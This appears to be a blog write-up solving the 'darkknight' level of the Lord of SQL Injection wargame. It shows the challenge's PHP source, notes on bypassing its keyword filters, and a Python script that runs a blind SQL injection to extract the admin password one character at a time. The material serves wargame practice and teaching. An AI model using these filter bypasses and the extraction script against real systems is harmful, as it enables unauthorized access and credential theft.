---
layout: post
title:  "los prob_darkknight"
date:   2019-09-05
excerpt: "Lord of Sql Injection"
tag:
- los
- blind_sqli
- wargame
- webhacking
comments: true
---
> query : select id from prob_darkknight where id='guest' and pw='' and no=

~~~ php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight"); 
  highlight_file(__FILE__); 
?>
~~~

# Solve
1. '(싱글쿼터) 필터링 -> hex값으로 우회가능
2. substr 필터링 -> mid함수로 우회가능
3. ascii 필터링 -> ord함수로 우회가능
4. = 필터링 -> like로 우회가능

~~~ python 
# python 3.7
# darkknight_ex.py

import requests

url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
cookies = {"PHPSESSID":"XXXXXXXXX"}

# Find pw length
print("[+] Start find pw's length")
length = 0
while True:
    params = {"pw":"noonzib","no":"9999 or id like 0x61646d696e and length(pw) like "+str(length)}
    response = requests.get(url, params=params, cookies=cookies)
    print(response.url)
    if (response.text.find("Hello admin") != -1):
        print("[-] Find length :",length)
        break
    else:
        length += 1

# Find pw
print("[+] Start find pw")
flag = ""
for i in range(1,length+1):
    for j in range(48,127):
        params = {"pw" : "noonzib", "no":"9999 or id like 0x61646d696e and ord(mid(pw,"+str(i)+",1)) like "+str(j)}
        response = requests.get(url,params=params,cookies=cookies)
        if(response.text.find("Hello admin") != -1):
            flag += chr(j)
            print("[-] Find Key :",flag)
            break
print("[+] Finish :",flag)
~~~

## DARKKNIGHT Clear!
